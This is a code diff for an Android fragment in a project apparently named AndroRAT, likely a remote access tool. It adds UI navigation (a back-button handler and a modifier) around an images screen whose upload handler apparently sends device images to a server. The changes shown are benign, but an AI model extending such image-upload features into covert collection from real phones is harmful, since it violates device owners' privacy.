@@ -10,13 +10,15 @@ import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import androidx.compose.runtime.rememberCoroutineScope
+import androidx.compose.ui.Modifier
 import androidx.compose.ui.platform.ComposeView
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.viewModels
+import androidx.navigation.fragment.findNavController
 import com.ierusalem.androrat.core.data.networking.RetrofitInstance
+import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
 import com.ierusalem.androrat.features.home.domain.model.Image
 import com.ierusalem.androrat.features.images.domain.ImageViewModel
-import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
 import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
@@ -109,7 +111,15 @@ class ImageFragment : Fragment() {
                     val scope = rememberCoroutineScope()
 
                     ImagesScreen(
+                        modifier = Modifier,
                         images = viewModel.images,
+                        eventHandler = { event ->
+                            when (event) {
+                                ImagesScreenEvents.NavIconClick -> {
+                                    findNavController().popBackStack()
+                                }
+                            }
+                        },
                         onUploadClick = {
                             val apiService = RetrofitInstance(requireContext()).api
                             val images = viewModel.images
